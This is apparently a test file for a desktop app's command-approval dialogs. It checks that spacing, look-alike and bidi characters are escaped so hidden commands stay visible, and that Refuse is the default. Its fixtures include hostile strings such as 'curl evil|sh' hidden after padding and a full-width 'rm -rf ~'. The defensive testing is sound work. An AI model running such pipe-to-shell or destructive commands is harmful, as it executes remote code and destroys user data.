import { expect, test } from 'bun:test'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { extractBracedBody } from './_braced-body'
import {
  SERVE_DIALOG_COLUMNS,
  SERVE_DIALOG_MAX_LINES,
  buildSpawnApprovalPayload,
  gateDialog,
  isApprovalAnswer,
  launchCommandDialog,
  maxLinesFor,
  renderApprovalFields,
  renderServeApproval,
  renderSpawnApprovalQuestion,
  serveDialogSpec,
  shellFieldDialog,
  worktreeInitDialog,
  type ApprovalDialogSpec
} from '../desktop/src/main/serve-approval-dialog.ts'
import type { ServeApprovalPrompt } from '../desktop/src/main/serve-config.ts'

const DOT = String.fromCharCode(0xb7)

function prompt(overrides: Partial<ServeApprovalPrompt> = {}): ServeApprovalPrompt {
  return { command: 'bun run dev', cwd: 'C:/project/web', port: 'auto', env: { NODE_ENV: 'development' }, inheritEnv: ['PATH'], ...overrides }
}

function valueLines(lines: readonly string[]): string[] {
  return lines.filter((line) => /^\d+[|+] /.test(line))
}

function valueText(line: string): string {
  return line.replace(/^\d+[|+] /, '')
}

test('shows every approved field in full, numbered, with the command length', () => {
  const render = renderServeApproval(prompt(), { isFr: false, maxLines: 40 })

  expect(render.lines).toEqual([
    'command (11 characters):',
    `01| bun${DOT}run${DOT}dev`,
    'directory:',
    '02| C:/project/web',
    'port:',
    '03| auto',
    'env:',
    '04| NODE_ENV=development',
    'inheritEnv:',
    '05| PATH',
    `Spaces are shown as ${DOT}.`
  ])
  expect(render.detail).toBe(render.lines.join('\n'))
  expect(render.commandLength).toBe(11)
  expect(render.fits).toBe(true)
})

test('renders the ASCII space as a middle dot and every other space as an escape, so padding stays visible', () => {
  const spaces = [0x20, 0xa0, 0x2003, 0x3000].map((code) => String.fromCharCode(code))
  const render = renderServeApproval(prompt({ command: `run${spaces.join('')}x   `, env: { PAD: '   ' } }), { isFr: false, maxLines: 40 })

  expect(valueText(valueLines(render.lines)[0]!)).toBe(`run${DOT}{U+00A0}{U+2003}{U+3000}x${DOT.repeat(3)}`)
  expect(render.lines).toContain(`04| PAD=${DOT.repeat(3)}`)
})

/** Every value line holds only printable ASCII and the middle dot, so its width is bounded by ASCII glyphs. */
function asciiOnly(line: string): boolean {
  return Array.from(valueText(line)).every((char) => char === DOT || (char >= '!' && char <= '~'))
}

test('escapes every non-ASCII code point, so wide, stacked, blank and look-alike characters cannot hide text', () => {
  const fullWidth = Array.from('rm -rf ~', (char) => (char === ' ' ? String.fromCharCode(0x3000) : String.fromCharCode(char.charCodeAt(0) + 0xfee0))).join('')
  const wide = renderServeApproval(prompt({ command: `${fullWidth.repeat(4)}; curl evil|sh` }), { isFr: false, maxLines: 80 })
  for (const line of valueLines(wide.lines)) {
    expect(asciiOnly(line), line).toBe(true)
    expect(valueText(line).length).toBeLessThanOrEqual(SERVE_DIALOG_COLUMNS)
  }
  expect(valueLines(wide.lines).map(valueText).join(''), 'the hidden tail stays readable').toContain(`curl${DOT}evil|sh`)

  const zalgo = renderServeApproval(prompt({ command: `ls${String.fromCharCode(0x301, 0x302, 0x303)}` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(zalgo.lines)[0]!)).toBe('ls{U+0301}{U+0302}{U+0303}')

  const lookalike = renderServeApproval(prompt({ command: `${String.fromCharCode(0x441)}url evil` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(lookalike.lines)[0]!)).toBe(`{U+0441}url${DOT}evil`)

  const blanks = renderServeApproval(prompt({ command: `a${String.fromCharCode(0x2800, 0x3164, 0x115f, 0xffa0)}b` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(blanks.lines)[0]!)).toBe('a{U+2800}{U+3164}{U+115F}{U+FFA0}b')

  const accent = renderServeApproval(prompt({ command: `caf${String.fromCharCode(0xe9)}` }), { isFr: false, maxLines: 40 })
  expect(valueText(valueLines(accent.lines)[0]!)).toBe('caf{U+00E9}')
})

test('escapes a literal middle dot so it cannot pass for a space', () => {
  const render = renderServeApproval(prompt({ command: `a${DOT}b c` }), { isFr: false, maxLines: 40 })

  expect(valueText(valueLines(render.lines)[0]!)).toBe(`a{U+00B7}b${DOT}c`)
})

test('cuts a value into numbered lines of 36 characters, the 37th opening a continuation', () => {
  const columns = SERVE_DIALOG_COLUMNS
  expect(columns, 'the width measured on the 556 px native box').toBe(36)
  const exact = renderServeApproval(prompt({ command: 'W'.repeat(columns) }), { isFr: false, maxLines: 40 })
  expect(valueLines(exact.lines)[0]).toBe(`01| ${'W'.repeat(columns)}`)
  expect(valueLines(exact.lines)[1]).toBe('02| C:/project/web')

  const over = renderServeApproval(prompt({ command: 'W'.repeat(columns + 1) }), { isFr: false, maxLines: 40 })
  expect(valueLines(over.lines).slice(0, 2)).toEqual([`01| ${'W'.repeat(columns)}`, '02+ W'])

  const long = renderServeApproval(prompt({ command: 'x'.repeat(1000) }), { isFr: false, maxLines: 400 })
  for (const line of valueLines(long.lines)) expect(Array.from(valueText(line)).length).toBeLessThanOrEqual(columns)
  expect(valueLines(long.lines).filter((line) => line.includes('x')).map(valueText).join('')).toBe('x'.repeat(1000))
})

test('escapes a code point outside the BMP as one unit and never splits an escape across lines', () => {
  const astral = String.fromCodePoint(0x1d54f)
  const render = renderServeApproval(prompt({ command: `ab${astral.repeat(3)}` }), { isFr: false, maxLines: 40, columns: 12 })

  expect(valueLines(render.lines).slice(0, 3).map(valueText)).toEqual(['ab{U+1D54F}', '{U+1D54F}', '{U+1D54F}'])
  expect(render.commandLength).toBe(5)
})

test('makes a control or bidi character that slipped past the parse visible as an escape', () => {
  const render = renderServeApproval(prompt({ command: `ls${String.fromCharCode(0x202e)}x${String.fromCharCode(0x0a)}y` }), { isFr: false, maxLines: 40 })

  expect(valueText(valueLines(render.lines)[0]!)).toBe('ls{U+202E}x{U+000A}y')
})

test('shows a dash for an empty env or inheritEnv instead of dropping the field', () => {
  const render = renderServeApproval(prompt({ env: {}, inheritEnv: [] }), { isFr: true, maxLines: 40 })

  expect(render.lines).toContain('env:')
  expect(render.lines).toContain('inheritEnv:')
  expect(render.lines.filter((line) => line === '    -')).toHaveLength(2)
  expect(render.lines[0]).toBe('commande (11 caractères) :')
})

test('does not fit when the rendered lines exceed the budget', () => {
  const base = renderServeApproval(prompt(), { isFr: false, maxLines: 40 })
  expect(renderServeApproval(prompt(), { isFr: false, maxLines: base.lines.length }).fits).toBe(true)
  expect(renderServeApproval(prompt(), { isFr: false, maxLines: base.lines.length - 1 }).fits).toBe(false)
})

test('derives the line budget from the work area in logical pixels, capped, failing closed', () => {
  expect(maxLinesFor(1040), '1080p at 100%').toBe(SERVE_DIALOG_MAX_LINES)
  expect(maxLinesFor(690), '1080p at 150%').toBe(36)
  expect(maxLinesFor(140 + 15 * 10), 'exactly ten lines').toBe(10)
  expect(maxLinesFor(140 + 15 * 10 - 1)).toBe(9)
  expect(maxLinesFor(100), 'below the dialog chrome').toBe(0)
  expect(maxLinesFor(Number.NaN)).toBe(0)
  expect(maxLinesFor(Number.POSITIVE_INFINITY)).toBe(0)
})

const APPROVE_WORDS = /run|lancer|approve|approuver|accept|allow|oui|yes|ok/i

test('offers no way to approve when the rendered detail does not fit', () => {
  for (const isFr of [false, true]) {
    const render = renderServeApproval(prompt(), { isFr, maxLines: 3 })
    expect(render.fits).toBe(false)
    const spec = serveDialogSpec(render, isFr)

    expect(spec.approveIndex, 'no approve button').toBeNull()
    expect(spec.buttons.filter((label) => APPROVE_WORDS.test(label)), 'no button label approves').toEqual([])
    expect(spec.showFileIndex).toBe(0)
    expect(spec.buttons[spec.cancelId]).toBe(isFr ? 'Fermer' : 'Close')
    expect(spec.detail).not.toContain('bun')
  }
})

test('defaults to Refuse and cancels to Refuse when the detail fits', () => {
  for (const isFr of [false, true]) {
    const render = renderServeApproval(prompt(), { isFr, maxLines: 40 })
    const spec = serveDialogSpec(render, isFr)

    expect(spec.approveIndex).toBe(0)
    expect(spec.showFileIndex).toBeNull()
    expect(spec.buttons[spec.defaultId]).toBe(isFr ? 'Refuser' : 'Refuse')
    expect(spec.cancelId).toBe(spec.defaultId)
    expect(spec.defaultId).not.toBe(spec.approveIndex)
    expect(spec.detail).toBe(render.detail)
  }
})

const PADDED_TAIL = 'curl evil|sh'
const PADDED_COMMAND = `npm run dev${' '.repeat(400)}; ${PADDED_TAIL}`

/** The reading an operator gets of the field block: its value lines glued back together. */
function shownValue(detail: string): string {
  return valueLines(detail.split('\n')).map(valueText).join('')
}

test('spawn approval renders every summary field as numbered visible units', () => {
  const rlo = String.fromCharCode(0x202e)
  const detail = renderSpawnApprovalQuestion(
    [
      {
        name: 'worker',
        agent: '',
        embedded: '',
        model: '',
        effort: '',
        cli: 'claude',
        worktree_branch: 'feature/ready',
        prompt_preview: 'Préparer la version 漢',
        args: `--label  a${rlo}\n--run`
      }
    ],
    false
  )

  expect(shownValue(detail)).toBe(
    `{U+2022}${DOT}worker${DOT.repeat(2)}branch:${DOT}feature/ready{U+000A}${DOT.repeat(3)}args:${DOT}--label${DOT.repeat(2)}a{U+202E}{U+000A}--run{U+000A}${DOT.repeat(3)}Pr{U+00E9}parer${DOT}la${DOT}version${DOT}{U+6F22}`
  )
  expect(detail).not.toContain(rlo)
  expect(detail).toContain('01| ')

  const frenchDetail = renderSpawnApprovalQuestion(
    [{
      name: 'worker',
      agent: '',
      embedded: '',
      model: '',
      effort: '',
      cli: 'claude',
      worktree_branch: 'feature/ready',
      prompt_preview: '',
      args: ''
    }],
    true
  )
  expect(shownValue(frenchDetail)).toContain(`branche:${DOT}feature/ready`)
  expect(frenchDetail).not.toContain('{U+2387}')
})

test('spawn payload identifies its caller and action with localized visible fields', () => {
  const rlo = String.fromCharCode(0x202e)
  const payload = buildSpawnApprovalPayload(
    [
      {
        name: `worker\n${rlo}漢`,
        agent: '',
        embedded: '',
        model: '',
        effort: '',
        cli: 'claude',
        worktree_branch: '',
        prompt_preview: '',
        args: '--label   value'
      }
    ],
    'team-lead-deadbeef',
    true
  )

  expect(payload.title).toBe(`L'agent "team-lead-deadbeef" veut lancer 1 session d'agent`)
  expect(payload.question).toContain('01| ')
  expect(payload.question).not.toContain(rlo)
  expect(payload.question).not.toContain('漢')
  expect(payload.question).toContain(`Les espaces sont affichés ${DOT}.`)

  expect(buildSpawnApprovalPayload([], 'team-lead-deadbeef', false).title).toBe(
    'Agent "team-lead-deadbeef" wants to spawn 0 agent sessions'
  )
  expect(buildSpawnApprovalPayload([], 'team-lead-deadbeef', true).title).toBe(
    `L'agent "team-lead-deadbeef" veut lancer 0 sessions d'agent`
  )
})

test('requestSpawnGrant sends both approval fields from its one payload builder', () => {
  const src = readFileSync(join(import.meta.dir, '..', 'desktop', 'src', 'main', 'index.ts'), 'utf8')
  const anchor =
    /function requestSpawnGrant\(\s*mode: 'team-review' \| 'full-control',\s*callerId: string,\s*deps: ApprovalDeps\s*\): \(plan: SpawnGrantPlanItem\[\]\) => Promise<\{ pending: true \} \| \{ pending: false; granted: boolean \}> \{/g
  const matches = [...src.matchAll(anchor)]
  expect(matches.length, 'requestSpawnGrant must retain its expected signature so its sole approval payload is scanned').toBe(1)
  const match = matches[0]!
  const body = extractBracedBody(src, match.index + match[0].length - 1)
  expect(body, 'requestSpawnGrant must build one caller-aware localized payload').toContain(
    'const payload = buildSpawnApprovalPayload(summaries, callerId, isFrLocale())'
  )

  expect(
    [...body.matchAll(/\baddApproval\b/g)],
    'requestSpawnGrant must reference addApproval exactly once: an alias or a second call with a named object would bypass the scanned object'
  ).toHaveLength(1)

  const calls = [...body.matchAll(/addApproval\(deps,\s*\{/g)]
  expect(calls, 'requestSpawnGrant must pass exactly one direct approval object').toHaveLength(1)
  const call = calls[0]!
  const object = extractBracedBody(body, call.index + call[0].lastIndexOf('{'))
  expect(object, 'the direct approval object must keep the payload title').toContain('title: payload.title')
  expect(object, 'the direct approval object must keep the rendered payload question').toContain('question: payload.question')
  expect(object, 'the direct approval object must not spread another object: a spread after title/question could overwrite them').not.toContain('...')
})

test('launch command door shows padding as dots and keeps the hidden tail readable, Refuse by default', () => {
  for (const isFr of [false, true]) {
    const spec = launchCommandDialog(PADDED_COMMAND, { isFr, maxLines: 40 })

    expect(spec.approveIndex).toBe(0)
    expect(shownValue(spec.detail)).toBe(PADDED_COMMAND.replaceAll(' ', DOT))
    expect(spec.detail, 'no raw run of spaces reaches the box').not.toContain('  ')
    expect(spec.detail.startsWith(isFr ? 'Commande (config du projet) :' : 'Command (project config):')).toBe(true)
    expect(spec.buttons).toEqual(isFr ? ['Utiliser cette commande', 'Refuser'] : ['Use this command', 'Refuse'])
    expect(spec.defaultId).toBe(1)
    expect(spec.cancelId).toBe(1)
  }
})

test('worktree hook door shows padding as dots, with its own wording, Refuse by default', () => {
  for (const isFr of [false, true]) {
    const spec = worktreeInitDialog(PADDED_COMMAND, { isFr, maxLines: 40 })

    expect(spec.approveIndex).toBe(0)
    expect(shownValue(spec.detail)).toBe(PADDED_COMMAND.replaceAll(' ', DOT))
    expect(spec.detail, 'no raw run of spaces reaches the box').not.toContain('  ')
    expect(spec.detail.startsWith(isFr ? 'Hook (config du projet) :' : 'Hook (project config):')).toBe(true)
    expect(spec.message).toBe(
      isFr ? 'Ce projet définit un hook exécuté à la création de worktree.' : 'This project defines a worktree-creation init hook.'
    )
    expect(spec.buttons).toEqual(isFr ? ['Exécuter ce hook', 'Refuser'] : ['Run this hook', 'Refuse'])
    expect(spec.defaultId).toBe(1)
    expect(spec.cancelId).toBe(1)
  }
})

test('shell field door numbers every item, shows the label and basename, and has no bullet', () => {
  const items = ['dev: --model a', `ops: ${PADDED_COMMAND}`]
  for (const isFr of [false, true]) {
    const spec = shellFieldDialog({
      isFr,
      maxLines: 40,
      message: 'm',
      label: isFr ? 'Modèle' : 'Template',
      basename: 'tpl.json',
      items,
      buttons: ['Apply', 'Refuse']
    })

    expect(spec.approveIndex).toBe(0)
    expect(spec.detail.startsWith(isFr ? 'Modèle :\n01| tpl.json' : 'Template:\n01| tpl.json')).toBe(true)
    expect(shownValue(spec.detail)).toBe(`tpl.json${items.join('')}`.replaceAll(' ', DOT))
    expect(valueLines(spec.detail.split('\n'))[1]).toBe(`02| dev:${DOT}--model${DOT}a`)
    expect(spec.detail).not.toContain(String.fromCharCode(0x2022))
    expect(spec.detail, 'trust sentence closes the dialog').toContain(
      isFr ? 'Accepte uniquement si tu fais confiance à ce dépôt.' : 'Accept only if you trust this repository.'
    )
    expect(spec.buttons).toEqual(['Apply', 'Refuse'])
    expect(spec.defaultId).toBe(1)
    expect(spec.cancelId).toBe(1)
  }
})

test('shell field door shows a hostile basename numbered and escaped, never as raw lines', () => {
  const lf = String.fromCharCode(10)
  const rlo = String.fromCharCode(0x202e)
  const basename = `a${lf}01| x${rlo}b`
  const spec = shellFieldDialog({
    isFr: false,
    maxLines: 40,
    message: 'm',
    label: 'Workspace',
    basename,
    items: ['x: ls'],
    buttons: ['Restore', 'Refuse']
  })

  const lines = spec.detail.split(lf)
  expect(lines.slice(0, 2)).toEqual(['Workspace:', `01| a{U+000A}01|${DOT}x{U+202E}b`])
  expect(lines.filter((line) => /^\d+[|+] /.test(line)).map((line) => line.slice(0, 2))).toEqual(['01', '02'])
  expect(spec.detail).not.toContain(rlo)
})

test('every gate door offers no way to approve and never echoes the text when it does not fit', () => {
  const huge = 'x'.repeat(3000)
  for (const isFr of [false, true]) {
    const specs = [
      launchCommandDialog(huge, { isFr, maxLines: 40 }),
      worktreeInitDialog(huge, { isFr, maxLines: 40 }),
      shellFieldDialog({ isFr, maxLines: 40, message: 'm', label: 'l', basename: 'b', items: [huge], buttons: ['Apply', 'Refuse'] })
    ]
    for (const spec of specs) {
      expect(spec.approveIndex, 'no approve button').toBeNull()
      expect(spec.showFileIndex).toBeNull()
      expect(spec.buttons).toEqual([isFr ? 'Fermer' : 'Close'])
      expect(spec.defaultId).toBe(0)
      expect(spec.cancelId).toBe(0)
      expect(spec.detail).not.toContain('xxxx')
      expect(spec.detail).toMatch(/\d+ (lines|lignes)/)
    }
  }
})

test('a gate door with no usable work area refuses', () => {
  for (const maxLines of [0, maxLinesFor(Number.NaN), maxLinesFor(100)]) {
    expect(launchCommandDialog('ls', { isFr: false, maxLines }).approveIndex).toBeNull()
  }
})

test('the sentences around the fields take lines from the budget', () => {
  const fieldLines = renderApprovalFields([{ label: '', items: ['ls'] }], { isFr: false, maxLines: 99 }).lines.length
  let firstFitting = -1
  for (let maxLines = 0; maxLines < 40 && firstFitting < 0; maxLines++) {
    if (launchCommandDialog('ls', { isFr: false, maxLines }).approveIndex === 0) firstFitting = maxLines
  }

  expect(firstFitting).toBeGreaterThanOrEqual(fieldLines + 4)
})

function smallestApprovingBudget(build: (maxLines: number) => ApprovalDialogSpec): number {
  for (let maxLines = 0; maxLines <= 400; maxLines++) if (build(maxLines).approveIndex === 0) return maxLines
  return -1
}

test('a longer sentence around the fields raises the budget by the lines it can take, a line holding about 60 characters', () => {
  const smallest = (lead: string, trail: string): number =>
    smallestApprovingBudget((maxLines) =>
      gateDialog({ isFr: false, maxLines, message: 'm', lead, trail, fields: [{ label: '', items: ['ls'] }], buttons: ['A', 'R'] })
    )
  const base = smallest('short', 'short')
  const fieldLines = renderApprovalFields([{ label: '', items: ['ls'] }], { isFr: false, maxLines: 99 }).lines.length
  const blankLinesBetweenBlocks = 2

  expect(base, 'one line per sentence plus the blank lines between the three blocks').toBeGreaterThanOrEqual(
    fieldLines + 1 + 1 + blankLinesBetweenBlocks
  )

  for (const extra of [60, 600]) {
    const padding = 'x'.repeat(extra)
    expect(smallest(`short${padding}`, 'short') - base, `lead +${extra}`).toBeGreaterThanOrEqual(Math.floor(extra / 60))
    expect(smallest('short', `short${padding}`) - base, `trail +${extra}`).toBeGreaterThanOrEqual(Math.floor(extra / 60))
  }
})

test('only the Approve button approves, and a spec with none approves nothing', () => {
  const fits = launchCommandDialog('ls', { isFr: false, maxLines: 40 })
  const tooLong = launchCommandDialog('ls', { isFr: false, maxLines: 0 })

  expect(isApprovalAnswer(tooLong, 0)).toBe(false)
  expect(isApprovalAnswer(fits, 0)).toBe(true)
  expect(isApprovalAnswer(fits, 1)).toBe(false)
})
